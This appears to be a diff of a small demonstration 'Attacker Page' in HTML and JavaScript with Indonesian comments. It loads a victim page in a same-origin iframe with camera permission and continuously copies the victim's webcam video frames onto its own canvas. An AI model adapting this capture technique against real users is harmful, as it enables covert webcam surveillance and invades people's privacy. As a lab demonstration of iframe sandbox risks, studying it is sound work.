@@ -1,22 +1,44 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Attacker Page</title>
+<style>
+  body { font-family: sans-serif; text-align: center; margin-top: 50px; }
+  iframe { width: 320px; height: 240px; border: 2px solid black; }
+  canvas { display: block; margin-top: 20px; border: 1px solid black; }
+</style>
+</head>
+<body>
+
+<h2>Attacker Page</h2>
+<p>Viewer: hanya menampilkan kamera Victim + snapshot otomatis</p>
+
 <iframe id="victimFrame" src="victim.html" sandbox="allow-scripts allow-same-origin allow-forms allow-camera"></iframe>
+<canvas id="snapshotCanvas"></canvas>
+
 <script>
 const iframe = document.getElementById("victimFrame");
+const canvas = document.getElementById("snapshotCanvas");
+const ctx = canvas.getContext("2d");
 
-// Tunggu iframe load
 iframe.onload = () => {
-  const victimDoc = iframe.contentDocument || iframe.contentWindow.document;
+  const victimWin = iframe.contentWindow;
+  const victimDoc = victimWin.document;
   const video = victimDoc.getElementById("video");
 
-  // Misal kita buat tombol Attacker capture frame langsung
-  // (harus same-origin supaya JS bisa akses video)
-  setInterval(() => {
-    if (video.srcObject) {
-      const canvas = document.createElement("canvas");
+  // Update canvas secara berkala dengan frame video
+  const updateCanvas = () => {
+    if (video && video.srcObject) {
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
-      canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
-      console.log("Attacker bisa mengambil snapshot dari Victim");
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
     }
-  }, 3000); // setiap 3 detik
+    requestAnimationFrame(updateCanvas);
+  };
+  updateCanvas();
 };
 </script>
+
+</body>
+</html>
